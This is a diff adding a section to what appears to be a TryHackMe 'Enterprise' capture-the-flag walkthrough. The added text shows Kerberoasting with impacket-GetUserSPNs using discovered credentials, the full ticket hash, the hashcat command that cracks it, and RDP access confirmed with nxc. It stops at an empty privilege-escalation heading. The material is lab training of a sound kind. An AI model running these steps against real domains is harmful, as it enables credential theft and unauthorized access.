@@ -181,3 +181,46 @@ we got lists of users, also we can see a `bitbucket` name, which means they migh
 
 checking around github, and we got a git enterprise we name `Nik` checking each commit and we got a potential passwd. `nik:ToastyBoi!`
 
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
+└─$ impacket-GetUserSPNs -dc-ip 10.10.81.144  -outputfile hashes.asreproast1 lab.enterprise.thm/nik
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+Password:
+ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 02:20:01.333272  2021-04-26 16:16:41.570158             
+
+[-] CCache file is not found. Skipping...
+                                                                                                                                                            
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
+└─$ cat hashes.asreproast1  
+$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$4ee5d67fcb7af656269789f152b5102f$d6c5857a9e74dc1bce57adc76f4ff9b59a7eb60908b53f1965f8c650f1d378309a1b6b0609cf517b208862fce6fda3466365e71ffb0cfae5deca1142ba6f546daff458317669763a3cfff7910a4ae3ce8f1a54fc7d7a615b0e445e7a30250b297b531189b89008c161ab4affc80da05deb4795242ac47901821e820be7255cc2c39298e1e59acd6eda8b10b1feab8b5408cf93f8a2082f931eff884801a40b77e00b23abb10ea22364f1a2f7c77572e3b86e0af098b227086b14baa701bee9fdccf5f9043079a2af936ae1af15b0e5210a53ac9ca556fa15bafcd9dfd477ebe1f80d1191ee7340fc7b410309f4559a19699dd2bf811fea31da0b1f267f655f72f9668def7666189e949ca721eb63adb950d932bc59fe8e4a7f306784fb732bd12b14ab8f16caa3a7fa3411570c792d3b03b2d0658e74ce866f47c33e730bdd7fed1a81e993e07355262423ab5bdcfb10e0e5b0f92c0d90f69aa8ba3ad8848a2e0579238403fa6203c7547938d9998040886bcd042c1482c9070a63b8e756e607ed1a5736cba552e70ad522438231c368d9b1b8013502d9be363b853e4ed79b03391c38e1112e155b17cb370417c32a8102ad5d05a143c6722dcbe6b6b570acf0f9eb27718cb522586aec95e93693ed4ded86679f54d70c684560319da26455787a45138c4c8175bdb19b1af7e94a6f53236478f5f2caa16e062db1be50016eb551ba0b31f43b3f94a0818cc0c38f75e49e607dce37a361279f65a439eaa9685f8676d9a272423506ff24084f194259c1621bdd660ea6d913482729bc57434340d8e3f88744a07ecb5e93717afb710b5897894ac29fcd71829fc376ff9d4cea204658c6eec48379cc1523008f52b37b89f6a813edde431e3e9935039a70bfb9c91bbea72bc770fb20f20aaac94a0fef6a8103ad1ab328ae3f1d188d1d499219d2f6738e373a707264e905a4aff63ff62dcf9761e904f6716f33807d3a7e10b825845a053c603bed2cb39ae259a2c95d9b12020338247723fe4c902484d2c8ed6af6eefdf8441eb9731c017a1460d8dd19ecb34423e83b3b4d7b28d91c0647c8e5353a229123e551fc5fab135315bd917ca32bf9d734f80d9ce1278fa61204bd8da84877ad8620ae8078c1039951df17285a1c555428a9cfb904494541caa474e433c6bd7c2bd3e3a76e3f97e9d556766373293320286bff4e83fdad617fcef9d5c2ddb1b8e6ad4903bf1c99f2d3bebd10dd1b3e1468d2ea8164ba8cfe5106face1c38ef161a7229aa53bd14badef74a6a7fec780ce2234aa35bd6c28132bcfc82b354cf2065b8f4699947582b81918b378065b6342be39a40e584972fb50720a9cc13fd
+```
+DOing a kerberos attack using the creds gotten, we can see a keberoastable user `bitbucket`. Let's crack the password
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/30b121e2-d756-40cf-ac36-e762d427de89)
+
+```shell
+hashcat -m 13100 hashes.asreproast1 /usr/share/wordlists/rockyou.txt --force
+```
+cracked the hash. 
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Enterprise]
+└─$ sudo nxc rdp 10.10.81.144 -u bitbucket -p littleredbucket         
+RDP         10.10.81.144    3389   LAB-DC           [*] Windows 10 or Windows Server 2016 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (nla:True)
+RDP         10.10.81.144    3389   LAB-DC           [+] LAB.ENTERPRISE.THM\bitbucket:littleredbucket (Pwn3d!)
+```
+using nxc to chech for access, we can login RDP. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a3454f23-399f-42fd-8945-6e31c65931c0)
+
+we login RDP using the creds,
+
+
+
+## Privilege Escalation
+
+
+
